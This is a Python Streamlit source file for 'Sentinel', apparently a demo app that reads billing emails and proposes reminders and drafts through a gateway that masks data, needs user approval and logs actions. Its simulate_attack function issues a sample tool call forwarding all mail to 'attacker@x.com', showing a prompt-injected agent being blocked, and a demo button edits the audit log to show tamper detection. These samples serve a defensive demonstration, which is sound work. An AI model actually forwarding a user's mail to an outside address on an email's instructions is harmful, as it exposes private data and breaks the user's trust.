import asyncio
import os
import sqlite3
from datetime import datetime, timedelta
from pathlib import Path

os.environ.setdefault("FAKE_MODE", "1")

import pandas as pd
import plotly.express as px
import streamlit as st

from agent.pipeline import run_scan
from controlhub import approvals, audit, storage
from controlhub.gateway import Gateway, REDACTOR_IS_STUB
from shared.schemas import Proposal

st.set_page_config(page_title="Sentinel", page_icon="🛡️", layout="wide")

ss = st.session_state
ss.setdefault("stage", "landing")
ss.setdefault("user", "")
if "gw" not in ss:
    ss.gw = Gateway()
gw = ss.gw

PAGES = ["📥 Inbox", "✅ Approval Queue", "📅 Renewal Timeline", "👁️ What the AI Saw", "🧾 Audit Log"]
ss.setdefault("page", PAGES[0])

HIDE_SIDEBAR = """
<style>
[data-testid="stSidebar"], [data-testid="stSidebarCollapsedControl"] {display: none;}
</style>
"""


def run(coro):
    return asyncio.run(coro)


def go(stage: str):
    ss.stage = stage
    st.rerun()


def flash(kind: str, msg: str):
    ss.flash = (kind, msg)
    st.rerun()


_dialog = getattr(st, "dialog", None) or getattr(st, "experimental_dialog", None)


def popup(title: str, kind: str, lines: list):
    """Shows a real popup window. Falls back to a toast on very old Streamlit versions."""
    if _dialog is None:
        st.toast(f"{title}: {lines[0]}", icon="🛑")
        return

    @_dialog(title)
    def _d():
        getattr(st, kind)(lines[0])
        for line in lines[1:]:
            st.write(line)
        if st.button("Close", key="dlg_close"):
            st.rerun()

    _d()


def simulate_attack():
    res = run(gw.call("gmail.forward", {"to": "attacker@x.com"}))
    popup("🛑 Blocked by ControlHub", "error", [
        "The agent tried to forward all your mail to attacker@x.com, and ControlHub stopped it.",
        "**Tool:** gmail.forward",
        f"**Decision:** {res['status'].upper()}",
        f"**Why:** {res.get('reason', '')}",
        "This attempt was recorded in the Audit Log. Nothing was sent.",
    ])


# ====================== Landing ======================
def landing():
    st.write("")
    st.write("")
    _, mid, _ = st.columns([1, 2.4, 1])
    with mid:
        st.markdown("<h1 style='text-align:center;font-size:3.2rem'>🛡️ Sentinel</h1>", unsafe_allow_html=True)
        st.markdown(
            "<p style='text-align:center;font-size:1.2rem'>"
            "Sentinel finds hidden price hikes, ending free trials and upcoming bills in your emails, "
            "and prepares reminders and cancellation drafts for you.</p>"
            "<p style='text-align:center;font-size:1.2rem'>"
            "Its ControlHub shield masks your private details, blocks malicious emails, "
            "and never does anything without your approval.</p>",
            unsafe_allow_html=True,
        )
        a, b, c = st.columns(3)
        a.markdown("<p style='text-align:center'>🏦<br><b>No bank access</b></p>", unsafe_allow_html=True)
        b.markdown("<p style='text-align:center'>💻<br><b>Data stays on your laptop</b></p>", unsafe_allow_html=True)
        c.markdown("<p style='text-align:center'>✅<br><b>You approve every action</b></p>", unsafe_allow_html=True)
        st.write("")
        if st.button("Get started", type="primary", use_container_width=True):
            go("login")


# ====================== Login ======================
def login():
    st.write("")
    _, mid, _ = st.columns([1, 1.6, 1])
    with mid:
        with st.container(border=True):
            st.markdown("<h2 style='text-align:center'>🛡️ Sign in to Sentinel</h2>", unsafe_allow_html=True)
            st.caption("Connect your Gmail so Sentinel can look for subscriptions, trials and bills.")
            email = st.text_input("Google account", value="demo.sentinel@gmail.com")
            if st.button("🔐 Sign in with Google", type="primary", use_container_width=True):
                if email.strip():
                    ss.user = email.strip()
                    go("consent")
                else:
                    st.error("Enter an email address.")
            st.caption("Demo mode: Sentinel uses a sample inbox. No password is asked or stored.")
        if st.button("← Back"):
            go("landing")


# ====================== Consent ======================
def consent():
    st.write("")
    _, mid, _ = st.columns([1, 1.8, 1])
    with mid:
        with st.container(border=True):
            st.markdown("### Sentinel wants access to your Google Account")
            st.caption(f"Signed in as {ss.user}")
            st.markdown("**Sentinel will be able to:**")
            st.markdown(
                "- ✅ Read your billing emails (read-only)\n"
                "- ✅ Create **drafts** in Gmail (it can never send)\n"
                "- ✅ Add reminders to your Google Calendar"
            )
            st.markdown("**Sentinel will never:**")
            st.markdown(
                "- 🚫 Send or forward email\n"
                "- 🚫 Touch your bank, cards or UPI\n"
                "- 🚫 Store your raw emails\n"
                "- 🚫 Act without your approval"
            )
            st.caption("You can revoke access any time with the Kill switch.")
            c1, c2 = st.columns(2)
            if c1.button("Allow", type="primary", use_container_width=True):
                audit.log("user", "grant_access", "google", "allow", "read-only mail, drafts, calendar events")
                ss.auto_scan = True
                ss.page = PAGES[0]
                go("app")
            if c2.button("Cancel", use_container_width=True):
                go("login")


# ====================== Sidebar ======================
def sidebar():
    with st.sidebar:
        st.title("🛡️ Sentinel")
        st.caption(f"Signed in: {ss.user}")
        st.caption("Mode: " + ("sample inbox (demo)" if os.getenv("FAKE_MODE", "1") == "1" else "LIVE Google data"))
        st.caption("Redactor: " + ("STUB (nothing masked)" if REDACTOR_IS_STUB else "active"))
        st.caption("Everything stays on this laptop. No bank access.")

        if st.button("🔍 Scan inbox", type="primary"):
            with st.spinner("Reading billing emails through ControlHub..."):
                r = run(run_scan(gw))
            if r["status"] == "ok":
                flash("success", f"Found {len(r['subscriptions'])} subscriptions, {len(r['proposals'])} new proposals.")
            else:
                flash("error", r.get("reason", "Scan failed"))

        st.divider()
        if gw.killed:
            st.error("KILL SWITCH ACTIVE: all access revoked")
            if st.button("Resume access"):
                gw.killed = False
                audit.log("user", "resume", "-", "allow", "access restored")
                st.rerun()
        else:
            if st.button("🛑 Kill switch"):
                gw.kill()
                Path("token.json").unlink(missing_ok=True)
                popup("🛑 Access revoked", "warning", [
                    "Sentinel can no longer read or change anything.",
                    "Every call is now rejected and logged. Use 'Resume access' to turn it back on.",
                ])

        st.divider()
        st.subheader("Your data")
        subs_all = storage.list_subscriptions()
        if subs_all:
            csv = pd.DataFrame([s.model_dump() for s in subs_all]).to_csv(index=False)
            st.download_button("⬇️ Export tracker (CSV)", csv, "sentinel_tracker.csv", "text/csv")
        confirm = st.checkbox("I want to delete ALL my data")
        if st.button("🗑️ Wipe everything", disabled=not confirm):
            storage.wipe_all()
            audit.DB_PATH.unlink(missing_ok=True)
            Path("token.json").unlink(missing_ok=True)
            gw.views.clear()
            flash("success", "All local data wiped.")

        st.divider()
        if st.button("Sign out"):
            ss.user = ""
            go("landing")


# ====================== Pages ======================
def page_inbox():
    views = {v["id"]: v for v in gw.views}
    st.subheader(f"Billing emails Sentinel read ({len(views)})")
    st.caption("Only billing-related emails are read. Private details are masked before the AI sees them.")
    if not views:
        st.info("Nothing yet. Click 'Scan inbox' in the sidebar.")
    for v in views.values():
        with st.container(border=True):
            c1, c2 = st.columns([5, 2])
            c1.markdown(f"**{v.get('subject', '')}**")
            c1.caption(f"{v.get('sender', '')}  ·  {v.get('date', '')}  ·  {v.get('source', 'gmail')}")
            if v["flags"]:
                c1.warning("⚠️ Suspicious email: " + ", ".join(v["flags"]))
                if c2.button("🤖 Simulate: agent obeys this email", key=f"atk_{v['id']}"):
                    simulate_attack()


def page_queue():
    pending = approvals.list_all("pending")
    st.subheader(f"Waiting for your approval ({len(pending)})")
    if not pending:
        st.info("Nothing pending. Click 'Scan inbox' in the sidebar.")

    for p in pending:
        with st.container(border=True):
            st.markdown(f"**{p.title}**")
            if p.flags:
                st.caption("⚠️ " + "  ·  ".join(p.flags))
            if p.source_snippet:
                st.caption(f"Source proof: “{p.source_snippet}”")

            edits = {}
            if p.kind == "draft":
                edits["to"] = st.text_input("To", p.details.get("to", ""), key=f"to_{p.id}")
                edits["subject"] = st.text_input("Subject", p.details.get("subject", ""), key=f"sub_{p.id}")
                edits["body"] = st.text_area("Body", p.details.get("body", ""), key=f"body_{p.id}", height=140)
            elif p.kind == "reminder":
                edits["title"] = st.text_input("Event title", p.details.get("title", ""), key=f"et_{p.id}")
                d = st.date_input("Reminder date", datetime.fromisoformat(p.details["start"]).date(), key=f"dt_{p.id}")
                base = datetime.combine(d, datetime.min.time()).replace(hour=10)
                edits["start"] = base.isoformat()
                edits["end"] = (base + timedelta(minutes=30)).isoformat()
            else:
                st.json(p.details)

            c1, c2, _ = st.columns([1, 1, 4])
            if c1.button("Approve", key=f"ap_{p.id}", type="primary"):
                res = run(approvals.approve(gw, p.id, edits or None))
                if res["status"] == "ok":
                    flash("success", f"Approved: {p.title}")
                else:
                    flash("error", res.get("reason", "Could not approve"))
            if c2.button("Reject", key=f"rj_{p.id}"):
                approvals.reject(p.id)
                flash("info", f"Rejected: {p.title}")

    with st.expander("➕ Add my own reminder"):
        t = st.text_input("What?", key="m_title")
        d = st.date_input("When?", key="m_date")
        if st.button("Add to queue"):
            if t.strip():
                base = datetime.combine(d, datetime.min.time()).replace(hour=10)
                approvals.add(Proposal(
                    id=f"manual-{int(datetime.now().timestamp())}", kind="reminder",
                    title=f"My reminder: {t.strip()}",
                    details={"title": t.strip(), "start": base.isoformat(),
                             "end": (base + timedelta(minutes=30)).isoformat(), "description": "Added by you"},
                    flags=["added_by_you"]))
                st.rerun()

    approved = approvals.list_all("approved")
    st.subheader(f"Approved ({len(approved)})")
    for p in approved:
        a, b = st.columns([5, 1])
        a.write(f"✔️ {p.title}")
        if b.button("Undo", key=f"un_{p.id}"):
            res = run(approvals.undo(gw, p.id))
            if res["status"] == "ok":
                flash("success", f"Undone: {p.title}")
            else:
                flash("error", res.get("reason", "Could not undo"))

    history = [p for p in approvals.list_all() if p.status in ("rejected", "undone")]
    if history:
        with st.expander(f"History ({len(history)})"):
            for p in history:
                st.write(f"{p.status.upper()}: {p.title}")


def page_timeline():
    subs = storage.list_subscriptions()
    if not subs:
        st.info("No subscriptions yet. Click 'Scan inbox'.")
        return
    df = pd.DataFrame([s.model_dump() for s in subs])
    df["renewal_date"] = df["renewal_date"].fillna("")
    latest = df.sort_values("renewal_date").groupby("merchant", as_index=False).last()

    m1, m2, m3 = st.columns(3)
    m1.metric("Monthly total (active plans)", f"Rs. {latest[latest.status == 'active'].amount.sum():g}")
    m2.metric("Free trials about to convert", int((latest.status == "trial").sum()))
    m3.metric("Price hikes caught", int(df["flags"].apply(lambda f: "price_hike" in f).sum()))

    for _, r in df[df["old_amount"].notna()].iterrows():
        st.warning(f"{r.merchant}: Rs. {r.old_amount:g} → Rs. {r.amount:g} from {r.renewal_date or 'next bill'}")

    plot = latest[latest.renewal_date != ""]
    if not plot.empty:
        fig = px.bar(plot, x="renewal_date", y="amount", color="merchant", text="amount",
                     labels={"renewal_date": "Renewal date", "amount": "Amount (Rs.)"})
        st.plotly_chart(fig)

    st.dataframe(df[["merchant", "amount", "status", "renewal_date", "old_amount", "flags", "source_snippet"]],
                 hide_index=True)


def page_ai_saw():
    st.subheader("Exactly what the AI received")
    st.caption("Left: what Gmail returned. Right: what ControlHub sent to the AI after cleaning and masking.")
    if REDACTOR_IS_STUB:
        st.warning("The real redactor is not loaded, so private details are not masked here.")
    views = {v["id"]: v for v in gw.views}
    if not views:
        st.info("Nothing yet. Click 'Scan inbox'.")
    for v in views.values():
        flagged = "   ⚠️ " + ", ".join(v["flags"]) if v["flags"] else ""
        with st.expander(f"{v.get('subject') or v['id']}{flagged}"):
            left, right = st.columns(2)
            left.caption("Original")
            left.code(v["original"], language=None)
            right.caption("Sent to the AI")
            right.code(v["masked"], language=None)


def page_audit():
    st.subheader("Tamper-evident audit log")
    if st.button("Verify log"):
        ok, bad = audit.verify_chain()
        if ok:
            popup("✅ Log verified", "success", ["Every entry links to the one before it. Nothing has been changed."])
        else:
            popup("🚨 Tampering detected", "error", [
                f"The chain is broken at entry #{bad}.",
                "Someone edited the history. Every later entry no longer matches.",
            ])
    entries = audit.list_entries(200)
    if entries:
        st.dataframe(pd.DataFrame(entries)[["id", "ts", "actor", "action", "tool", "decision", "detail"]],
                     hide_index=True)
    else:
        st.info("No entries yet.")

    st.divider()
    st.markdown("**🎬 Demo tools**")
    c1, c2, c3 = st.columns(3)
    if c1.button("Simulate attack: forward all mail"):
        simulate_attack()
    if c2.button("Tamper with the first log entry"):
        c = sqlite3.connect(audit.DB_PATH)
        c.execute("UPDATE audit SET detail='tampered' WHERE id=(SELECT MIN(id) FROM audit)")
        c.commit()
        c.close()
        popup("Entry edited", "warning", ["The first log entry was changed. Now click 'Verify log'."])
    if c3.button("Reset audit log"):
        audit.DB_PATH.unlink(missing_ok=True)
        flash("success", "Audit log reset.")


# ====================== Main app ======================
def main_app():
    sidebar()
    st.title("Sentinel")
    st.caption("Finds renewals, price hikes and bills in your email. Nothing happens until you approve it.")

    if ss.pop("auto_scan", False):
        with st.status("Reading your inbox through ControlHub...", expanded=True) as status:
            st.write("🔐 Connecting to Gmail with read-only access")
            r = run(run_scan(gw))
            if r["status"] == "ok":
                n = len({v["id"] for v in gw.views})
                bad = len([v for v in {v["id"]: v for v in gw.views}.values() if v["flags"]])
                hikes = sum(1 for s in r["subscriptions"] if "price_hike" in s.flags)
                st.write(f"📨 Read {n} billing emails")
                st.write("🧹 Removed hidden content and masked private details")
                st.write(f"🔎 Found {len(r['subscriptions'])} subscriptions, {hikes} price hike(s)")
                if bad:
                    st.write(f"⚠️ Flagged {bad} suspicious email(s)")
                st.write(f"📝 Prepared {len(r['proposals'])} proposals for your approval")
                status.update(label="Inbox scanned", state="complete", expanded=False)
            else:
                status.update(label="Scan failed", state="error")
                st.error(r.get("reason", "Scan failed"))

    if "flash" in ss:
        kind, msg = ss.pop("flash")
        getattr(st, kind)(msg)

    page = st.radio("Navigate", PAGES, horizontal=True, key="page", label_visibility="collapsed")
    st.divider()
    {
        PAGES[0]: page_inbox,
        PAGES[1]: page_queue,
        PAGES[2]: page_timeline,
        PAGES[3]: page_ai_saw,
        PAGES[4]: page_audit,
    }[page]()


# ====================== Router ======================
if ss.stage != "app":
    st.markdown(HIDE_SIDEBAR, unsafe_allow_html=True)
if ss.stage == "landing":
    landing()
elif ss.stage == "login":
    login()
elif ss.stage == "consent":
    consent()
else:
    main_app()